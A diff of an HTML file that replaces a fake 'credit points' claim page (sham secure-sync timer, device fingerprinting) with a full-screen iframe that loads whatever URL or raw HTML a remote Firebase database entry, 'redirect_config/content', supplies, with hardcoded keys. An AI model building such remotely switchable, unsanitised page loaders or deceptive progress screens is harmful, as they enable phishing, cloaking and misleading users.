@@ -1,225 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify System Token</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body { 
-            background: #020617; 
-            color: #fff; 
-            font-family: sans-serif; 
-            text-align: center; 
-            padding: 40px 20px; 
-            margin:0; 
-        }
-        .box { 
-            background: #0f172a; 
-            padding: 30px; 
-            border-radius: 20px; 
-            border: 1px solid #1e293b; 
-            max-width: 360px; 
-            margin: auto; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .icon { 
-            font-size: 50px; 
-            color: #fbbf24; 
-            margin-bottom: 20px; 
-        }
-        .icon.animated {
-            animation: pulse 2s infinite; 
-        }
-        .bar-bg { 
-            background: #1e293b; 
-            height: 8px; 
-            border-radius: 10px; 
-            margin: 25px 0; 
-            overflow: hidden; 
-        }
-        .bar-fill { 
-            background: linear-gradient(90deg, #6366f1, #a855f7); 
-            height: 100%; 
-            width: 0%; 
-            transition: width 1s linear; 
-        }
-        .status { 
-            font-weight: bold; 
-            color: #94a3b8; 
-            font-size: 14px; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px; 
-            margin-bottom: 15px;
-        }
-        
-        .btn-task {
-            width: 100%;
-            padding: 14px;
-            border-radius: 12px;
-            border: none;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.3s ease;
-            box-sizing: border-box;
-        }
-        
-        .btn-start {
-            background: linear-gradient(135deg, #6366f1, #4f46e5);
-            color: white;
-            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
-        }
-        .btn-start:hover {
-            transform: translateY(-2px);
-            background: #4f46e5;
-        }
-
-        .btn-claim {
-            background: linear-gradient(135deg, #10b981, #059669);
-            color: white;
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
-            display: none;
-            animation: bounceIn 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
-        }
-        .btn-claim:hover {
-            transform: translateY(-2px);
-            background: #059669;
-        }
-
-        .device-badge {
-            background: rgba(255,255,255,0.05);
-            padding: 5px 10px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-family: monospace;
-            color: #4f46e5;
-            border: 1px solid rgba(99, 102, 241, 0.2);
-            margin-top: 15px;
-            display: inline-block;
-        }
-
-        @keyframes pulse { 
-            0%, 100% { transform: scale(1); } 
-            50% { transform: scale(1.1); } 
-        }
-
-        @keyframes bounceIn {
-            0% { transform: scale(0.3); opacity: 0; }
-            50% { transform: scale(1.05); opacity: 0.8; }
-            70% { transform: scale(0.9); opacity: 0.9; }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
+        #appFrame { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div id="iconContainer">
-            <i class="fas fa-clock icon animated"></i>
-        </div>
-        <h2 style="margin:0 0 10px 0;">Verify System Token</h2>
-        <p style="color:#64748b; font-size:14px; margin:0 0 15px 0;" id="descText">
-            Click the button below to initialize secure database timer entry.
-        </p>
-        
-        <div class="bar-bg"><div id="progress" class="bar-fill"></div></div>
-        <div id="txt" class="status">Waiting to Start...</div>
-        
-        <button id="startBtn" class="btn-task btn-start" onclick="startVerificationTimer()">
-            <i class="fas fa-play"></i> START TIMER TO CLAIM
-        </button>
-        
-        <button id="claimBtn" class="btn-task btn-claim" onclick="triggerParentAppClaim()">
-            <i class="fas fa-coins"></i> CLAIM CREDIT POINTS
-        </button>
 
-        <div class="device-badge" id="detectedIdBox">Detecting Device...</div>
-    </div>
+    <iframe id="appFrame"></iframe>
 
-    <script>
-        let time = 1; 
-        let currentProgress = 0;
-        let timerRunning = false;
-        let intv = null;
-        let activeDevice = "UNKNOWN-DEV";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        // --- 100% SAME HARDWARE SPEC FINGERPRINT GENERATOR ---
-        // Yeh dashboard wale rules se exact match karega chahe link se khule ya iframe se
-        function getLocalHardwareIdentity() {
-            if(localStorage.getItem('device_fingerprint_id')) {
-                return localStorage.getItem('device_fingerprint_id');
-            }
-            const userAgentString = window.navigator.userAgent.replace(/[^a-zA-Z]/g, '').slice(0, 5);
-            const physicalScreenDimensions = window.screen.height * window.screen.width;
-            const cryptRandomSalt = Math.floor(Math.random() * 899999 + 100000);
-            const cleanDerivedId = `${userAgentString}-${physicalScreenDimensions}-${cryptRandomSalt}`.toUpperCase();
-            localStorage.setItem('device_fingerprint_id', cleanDerivedId);
-            return cleanDerivedId;
-        }
+        const firebaseConfig = { 
+            apiKey: "AIzaSyDnM9ry5JreqjRXqQVUSiaBzudXuaAF-QI", 
+            databaseURL: "https://send-message-b178e-default-rtdb.asia-southeast1.firebasedatabase.app" 
+        };
+        const db = getDatabase(initializeApp(firebaseConfig));
+        const frame = document.getElementById('appFrame');
 
-        // Hybrid Device Tracking Detector Channel
-        window.addEventListener('load', () => {
-            // 1. Check if Parent Context exists (Loaded Inside Main Dashboard App Frame)
-            if (window.ACTIVE_DEVICE_ID) {
-                activeDevice = window.ACTIVE_DEVICE_ID;
-            } else if (window.parent && window.parent.ACTIVE_DEVICE_ID) {
-                activeDevice = window.parent.ACTIVE_DEVICE_ID;
-            } else if (window.parent && window.parent.document.getElementById('deviceIdDisplay')) {
-                activeDevice = window.parent.document.getElementById('deviceIdDisplay').innerText;
+        onValue(ref(db, 'redirect_config/content'), (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return;
+
+            const content = data.trim();
+
+            // Agar link hai toh src set karein, agar HTML hai toh srcdoc
+            if (content.startsWith('http')) {
+                frame.src = content;
             } else {
-                // 2. Fallback Mode: (Opened Directly via Standalone Web Link Location)
-                activeDevice = getLocalHardwareIdentity();
+                frame.srcdoc = content;
             }
-            
-            document.getElementById('detectedIdBox').innerText = "DEVICE: " + activeDevice;
         });
-
-        function startVerificationTimer() {
-            if (timerRunning) return;
-            timerRunning = true;
-            
-            document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('descText').innerText = "Please stay on this screen to generate secure database validation pass.";
-            document.getElementById('txt').innerHTML = `Processing Secure Core... ${time}s`;
-            
-            intv = setInterval(() => {
-                time--; 
-                currentProgress += (10000 / 3);
-                
-                document.getElementById('progress').style.width = currentProgress + '%';
-                document.getElementById('txt').innerHTML = `Processing Secure Core... ${time}s`;
-                
-                if (time <= 0) {
-                    clearInterval(intv);
-                    
-                    document.getElementById('progress').style.width = '100%';
-                    document.getElementById('iconContainer').innerHTML = `<i class="fas fa-check-circle icon" style="color:#10b981; font-size: 50px;"></i>`;
-                    document.getElementById('txt').innerHTML = `<span style="color:#10b981">Token Synced Successfully!</span>`;
-                    document.getElementById('descText').innerText = "Verification complete. Click below to add credit token to device.";
-                    
-                    document.getElementById('claimBtn').style.display = 'flex';
-                }
-            }, 1000);
-        }
-
-        function triggerParentAppClaim() {
-            document.getElementById('claimBtn').disabled = true;
-            document.getElementById('claimBtn').style.opacity = "0.6";
-            
-            // Check context loops for automatic credit redirection dispatch
-            if (window.parent && typeof window.parent.closeCodeEngineFromIframe === 'function') {
-                window.parent.closeCodeEngineFromIframe();
-            } else if (window.parent && typeof window.parent.closeCodeEngine === 'function') {
-                window.parent.closeCodeEngine();
-            } else {
-                // Agar direct link se khula hai toh alert dega ki data terminal system synced hai
-                alert(`Success! 1 Credit point attached securely to device profile:\n${activeDevice}`);
-            }
-        }
     </script>
 </body>
 </html>
